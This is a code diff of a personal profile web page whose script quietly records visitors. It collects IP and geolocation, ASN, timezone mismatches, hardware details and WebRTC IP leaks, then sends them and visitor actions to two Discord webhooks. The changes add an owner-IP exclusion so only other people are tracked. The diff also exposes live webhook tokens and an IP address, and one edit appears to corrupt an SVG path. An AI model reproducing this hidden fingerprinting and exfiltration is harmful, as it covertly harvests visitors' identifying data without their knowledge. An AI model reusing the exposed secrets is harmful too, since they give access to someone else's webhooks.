@@ -176,7 +176,7 @@
       </button>
       <button onclick="delayedRedirect('https://www.roblox.com/users/1871164209/profile', 'roblox')" class="badge-link roblox" title="Open Roblox Profile">
         <svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor" style="display: block;">
-          <path d="M5.165 0L0 18.835 18.835 24 24 5.165 5.165 0zm10.51 14.18l-5.69-1.525 1.525-5.69 5.69 1.525-1.525 5.69z"/>
+          <path d="M5.165 0L0 18.835 18.835 24 24 5.165 0zm10.51 14.18l-5.69-1.525 1.525-5.69 5.69 1.525-1.525 5.69z"/>
         </svg>
       </button>
       <button onclick="delayedRedirect('https://open.spotify.com/user/31u5ifxsp3j6dg773hocztyiirfq?si=e51e78c289c84457', 'spotify')" class="badge-link spotify" title="Open Spotify">
@@ -186,8 +186,13 @@
   </main>
 
   <script>
+    /* Dedicated Dual Webhook Endpoints */
     const TELEMETRY_WEBHOOK_URL = "https://discord.com/api/webhooks/1562258375771815936/oN6p-UMSuNk_Iwl0UxXJULT4kdhTwuVMmi2x1RNFIKeQuUxPyO1Bz4f0DlnBbEHvgqMl";
     const ACTIONS_WEBHOOK_URL = "https://discord.com/api/webhooks/1561695471976718396/202rGNVBOZLFYYgjd1cSmoyNqvLVQYcXtdtPFBYbLG4ige3q0Rbrd1eZfBHpeNsWrN1H";
+
+    /* Owner IP Whitelist (Completely Excluded from Telemetry and Actions) */
+    const IGNORED_IPS = ["75.72.136.90"];
+    let isUserOwner = false;
 
     const video = document.getElementById('bg-video');
     const soundIcon = document.getElementById('sound-icon');
@@ -290,7 +295,7 @@
     setInterval(updateClock, 1000);
     updateClock();
 
-    /* Web Audio Engine */
+    /* Web Audio Synthesizer */
     let audioCtx;
     function playGlitchBlip() {
       try {
@@ -351,6 +356,7 @@
 
     /* CORS-Safe Discord Webhook Dispatcher */
     function sendDiscordWebhook(webhookUrl, username, embed) {
+      if (isUserOwner) return; // Completely abort for owner IP! :3
       try {
         const payload = JSON.stringify({
           username: username,
@@ -370,10 +376,12 @@
     }
 
     function sendTelemetryEmbed(embed) {
+      if (isUserOwner) return;
       sendDiscordWebhook(TELEMETRY_WEBHOOK_URL, "emolarp // access-telemetry", embed);
     }
 
     function sendActionEmbed(embed) {
+      if (isUserOwner) return;
       const now = Date.now();
       if (now - lastActionTime < 400) return;
       lastActionTime = now;
@@ -707,12 +715,10 @@
         keyBuffer = "";
       } else if (keyBuffer.endsWith("femboy")) {
         if (document.body.classList.contains("theme-femboy")) {
-          // Toggle Off Silently
           playGlitchBlip();
           document.body.classList.remove("theme-femboy");
           if (secretPopup) secretPopup.classList.remove("show");
         } else {
-          // Toggle On Silently (No toast banner)
           playBrightChime();
           document.body.classList.remove("theme-catboy");
           document.body.classList.add("theme-femboy");
@@ -1050,10 +1056,8 @@
       });
     }
 
-    /* Core Network Routing & Timezone Discrepancy Verification */
+    /* Core Network Routing & Telemetry (Owner IP Excluded) */
     async function recordVisit() {
-      const webrtcPromise = getWebRtcLeaks();
-
       let ip = "Direct Session";
       let locationText = "Unknown Region";
       let asnInfo = "Direct Client";
@@ -1068,6 +1072,14 @@
           const net = await netRes.json();
           if (net.success) {
             ip = net.ip || ip;
+
+            // Instantly halt if current IP matches your excluded address!
+            if (IGNORED_IPS.includes(ip)) {
+              isUserOwner = true;
+              console.log("[Owner session verified: All webhook telemetry silenced]");
+              return;
+            }
+
             locationText = [net.city, net.region_code, net.country].filter(Boolean).join(", ");
             ipTimezone = net.timezone ? net.timezone.id : "";
             
@@ -1091,6 +1103,8 @@
         }
       } catch (_) {}
 
+      if (IGNORED_IPS.includes(ip) || isUserOwner) return;
+
       const deviceTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
       if (ipTimezone && deviceTimezone && ipTimezone !== deviceTimezone) {
         isThreat = true;
@@ -1099,7 +1113,7 @@
 
       const cpuCores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Threads" : "Unknown";
       const ramApprox = navigator.deviceMemory ? navigator.deviceMemory + " GB RAM" : "Unknown RAM";
-      const leakedRtc = await webrtcPromise;
+      const leakedRtc = await getWebRtcLeaks();
 
       const ua = navigator.userAgent;
       let browser = "Browser";
